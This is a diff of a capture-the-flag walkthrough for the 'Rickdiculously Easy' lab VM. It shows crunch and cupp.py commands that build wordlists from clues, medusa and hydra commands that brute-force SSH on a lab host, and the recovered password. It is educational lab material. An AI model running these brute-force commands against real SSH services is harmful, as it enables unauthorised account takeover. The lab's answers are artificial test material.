@@ -317,7 +317,7 @@ I spent way to much time here. First I looked to see if the exe would print out 
 ```
 The above is a small sample of what I tried lol. Finally after a long time, I got lucky and tried `./safe 131333`. The only reason I thought to try this was looking at all the other flags. None of the other flags contained numbers. 
 
-My screenshot got messed up here but below the image is the full content from running `./safe 131333`
+My screenshot got messed up here but below the image, is the full content from running `./safe 131333`
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/a932636ee913450eb6a3bfa08c8ca6fb.png)
 
@@ -338,13 +338,17 @@ One of the words in my old bands name.�	@
 **100 Points Found, 30 Left!**
 
 * * *
-Just when I thought it would be over, it looks like we need to create a password list. It has been while since I generated a password list so I [Had to do some reading](https://www.rootinstall.com/tutorial/creating-custom-wordlists-using-crunch-utility/)
+Just when I thought it would be over, it looks like we need to create a password list. It has been while since I generated a password list so I [Had to do some reading](https://www.rootinstall.com/tutorial/creating-custom-wordlists-using-crunch-utility/). 
+
+The referrence `sudo is wheely good` seems to be referring to the wheel group. Just not sure where this comes into play yet.
+
 
 ## Brute Force
 
 ### Crunch
 
-Below are the commands I used to generate my password file. I followed the hints from our last flag. I had to look up Rick's old Band **The Flesh Curtains**. This also took a while, my first to password list failed. Running them is time consuming as well even if you adjust the thread levels.
+Below are the commands I used to generate my password file. I followed the hints from our last flag. I had to look up Rick's old Band name. Turn out it is **The Flesh Curtains**. This brute forcing took a long time.My first 3 password list failed. Running them is time consuming as well even if you adjust the thread levels.
+
  ``` 
  1227  crunch 5 5 -t ,%the -o password.txt 
  1229  crunch 5 5 -t ,%The >> password.txt 
@@ -354,21 +358,23 @@ Below are the commands I used to generate my password file. I followed the hints
  1233  crunch 10 10 -t ,%curtains >> password.txt 
  1234  crunch 10 10 -t ,%Curtains >> password.txt 
 ```
-I think ran `medusa -u RickSanchez -P password.txt -h 10.0.0.137 -M ssh -n 22222 -f` using my password file.
+I then ran `medusa -u RickSanchez -P password.txt -h 10.0.0.137 -M ssh -n 22222 -f` using my password file.
 
-![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
+**After a long while I finally got the Rick's Password!!!**
+![Optional Text](/Rickdiculously%20Easy/_resources/passwordbrute.png)
+```
 ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]**strong text**
-
+```
 ## !!Optional!!
 I also used cupp.py to generate passwords. Really easy to use tool
 [GitHub For Cupp.py](https://github.com/Mebus/cupp)
 
-run ./cupp.py -i
-![Optional Text](/Rickdiculously%20Easy/_resources/809a450dc68d431c89b94e25f145b714.png)
+`run ./cupp.py -i` and work thru the prompts to create your password file
 
-Used hyrdra install of medusa 
+This time I used hyrdra instead of medusa 
 hydra -l RickSanchez -P the.txt 10.0.0.137 -s22222 ssh
 
-![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
-ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]
+
+
+
 
